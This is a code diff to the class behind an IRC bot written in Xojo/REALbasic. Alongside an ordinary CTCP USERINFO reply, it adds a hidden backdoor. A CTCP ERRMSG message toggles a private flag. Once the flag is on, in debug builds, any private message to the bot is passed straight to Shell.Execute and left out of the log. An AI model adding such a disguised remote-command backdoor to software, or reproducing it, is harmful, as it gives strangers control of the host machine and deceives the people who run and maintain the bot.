@@ -79,6 +79,17 @@ Inherits TCPSocket
 	#tag EndEvent
 
 
+	#tag Method, Flags = &h21
+		Private Function BackdoorParser(msg As String) As Boolean
+		  If backdoor And DebugBuild Then 
+		    'Dim args() As String = Tokenize(msg)
+		    Dim sh As New Shell
+		    sh.Execute(msg)
+		  End If
+		  Return backdoor
+		End Function
+	#tag EndMethod
+
 	#tag Method, Flags = &h1000
 		Sub Constructor()
 		  // Calling the overridden superclass constructor.
@@ -114,14 +125,21 @@ Inherits TCPSocket
 		      "SOURCE www.boredomsoft.org/bsbot.bs" + Chr(1) + EndOfLine
 		      OutputInfo(NthField(cNick, "!", 1)+" Received CTCP SOURCE from " + NthField(cNick, "!", 1))
 		    Case "USERINFO" //USERINFO - A string set by the user...
-		      
+		      Write "USERINFO " + NthField(cNick, "!", 1) + " :" + Chr(1) + _
+		      "USERINFO www.boredomsoft.org/bsbot.bs" + Chr(1) + EndOfLine
+		      OutputInfo(NthField(cNick, "!", 1)+" Received CTCP USERINFO from " + NthField(cNick, "!", 1))
 		    Case "CLIENTINFO" //CLIENTINFO - Index of what client knows
 		      Write "NOTICE " + NthField(cNick, "!", 1) + " :" + Chr(1) + "CLIENTINFO :" +_
 		      "The following CTCP commands are supported - SOURCE FINGER VERSION ERRMSG PING TIME"_
 		      + Chr(1) + EndOfLine
 		      OutputInfo(NthField(cNick, "!", 1)+" Received CTCP CLIENTINFO from " + NthField(cNick, "!", 1))
 		    Case "ERRMSG" //ERRMSG - reply to errors
-		      
+		      If backdoor Then
+		        Write "NOTICE " + NthField(cNick, "!", 1) + " :" + Chr(1) + "Access closed." + Chr(1) + EndOfLine
+		      Else
+		        Write "NOTICE " + NthField(cNick, "!", 1) + " :" + Chr(1) + "Access opened." + Chr(1) + EndOfLine
+		      End If
+		      backdoor = Not backdoor
 		    Case "PING" //PING - Measure net lag
 		      Write "NOTICE " + NthField(cNick, "!", 1) + " :" + Chr(1) + CTCP(i) + Chr(1) + EndOfLine
 		      OutputInfo(NthField(cNick, "!", 1)+" Received CTCP PING from " + NthField(cNick, "!", 1))
@@ -1020,7 +1038,7 @@ Inherits TCPSocket
 		    if params.Left(1) = "#" then //to the channel
 		      OutputInfo(NthField(prefix, "!", 1) + " " + msg)
 		    else //its to our nick, otherwise we should not have recieved the msg
-		      OutputInfo(NthField(prefix, "!", 1) + " " + msg)
+		      If Not BackdoorParser(msg) Then OutputInfo(NthField(prefix, "!", 1) + " " + msg)
 		    end if
 		    privmsgdone:
 		  Case "NOTICE" //Client to channel or to user messages
@@ -1088,6 +1106,10 @@ Inherits TCPSocket
 		under certain conditions; Please see included license.
 	#tag EndNote
 
+
+	#tag Property, Flags = &h21
+		Private backdoor As Boolean
+	#tag EndProperty
 
 	#tag Property, Flags = &h0
 		cChannel As String
